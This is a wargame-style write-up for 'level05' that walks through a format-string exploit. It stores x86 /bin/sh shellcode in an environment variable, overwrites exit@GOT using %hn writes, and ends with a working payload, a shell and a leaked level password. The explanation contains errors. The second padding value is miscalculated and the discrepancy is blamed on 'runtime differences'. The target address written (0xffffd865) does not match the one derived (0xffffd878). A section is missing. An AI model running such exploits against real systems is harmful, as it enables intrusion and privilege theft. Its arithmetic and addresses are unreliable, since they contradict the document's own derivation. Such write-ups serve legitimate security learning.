<h1 align="center"> LEVEL 5 </h1>

## 🔍 Analysis of Decompiled [level5](./pseudo.c)

This write-up explainshow the `exit@GOT` address is obtained.

---

## 1. Preparing the shellcode in the environment

```bash
export SHELLCODE=$(python -c 'print "\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

\x90 is the NOP instruction.

100 NOPs create a NOP sled.

After the sled comes standard Linux x86 /bin/sh shellcode.

The shellcode is stored in an environment variable, which will be placed on the process stack at runtime.

The NOP sled allows execution to land anywhere inside it and still reach the shellcode.

## 2. Locating the shellcode address in memory
```bash
(gdb) x/2s *((char **)environ)
0xffffd864: "SHELLCODE=\220\220\220..."
0xffffd8e8: "SHELL=/bin/bash"
(gdb) x/2s 0xffffd864+20
0xffffd878: "\220\220\220\220..."
```
environ is an array of pointers to environment strings.

0xffffd864 points to the start of the string "SHELLCODE=...".

The bytes \220 shown by gdb correspond to octal 220 → hex 0x90 (NOP).

Important: this address points to "SHELLCODE=", not to the shellcode itself.

We add +20 to skip past "SHELLCODE=" and land inside the NOP sled.

Jumping to 0xffffd864 would execute ASCII characters (SHELLCODE=) → crash.

Jumping to 0xffffd878 executes NOPs, then slides into shellcode.

This is why the NOP sled is useful: the exact offset does not need to be precise.


## 3. Obtaining the exit@GOT address (added explanation)
```
objdump -R level05

level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   __gmon_start__
080497e0 R_386_JUMP_SLOT   exit
080497e4 R_386_JUMP_SLOT   __libc_start_main
```
The Global Offset Table (GOT) stores addresses of dynamically linked functions.

exit() is called right after printf().

Overwriting exit@GOT allows us to hijack execution after our format string runs.

target address: `exit@GOT = 0x080497e0`

## 5. Splitting the target address for %hn

Target value to write:
```
0xffffd865
```

Split into 16-bit parts (because %hn writes 2 bytes):
```
Low 16 bits: 0xd865 = 55416

High 16 bits: 0xffff = 65535
```
Addresses to write to:
```
Low → 0x080497e0

High → 0x080497e2
```
Little-endian encoding:
```
\xe0\x97\x04\x08
\xe2\x97\x04\x08
```
## 6. Byte counting and padding calculation

The payload starts with the two addresses:
```
4 + 4 = 8 bytes already printed
```
First write (low 16 bits)
```
55416 - 8 = 55408
```
Second write (high 16 bits)
```
65535 - 55408 = 10127
```

Due to minor runtime differences, the working value was adjusted slightly:
```
10119
```

This is normal in format string exploitation and does not change the logic.

## 7. Final payload execution

```
(python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%55408c"+"%10$hn"+"%10119c"+"%11$hn"' ; cat -) | ./level05
$ whoami
level05
cd ../level05
cat .pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

The addresses are placed first so %10$hn and %11$hn reference them.

%55408c prints enough characters to reach 0xd865.

%10$hn writes 0xd865 into exit@GOT.

%10119c increases the count to 0xffff.

%11$hn writes 0xffff into exit@GOT+2.

exit@GOT now contains 0xffffd865.




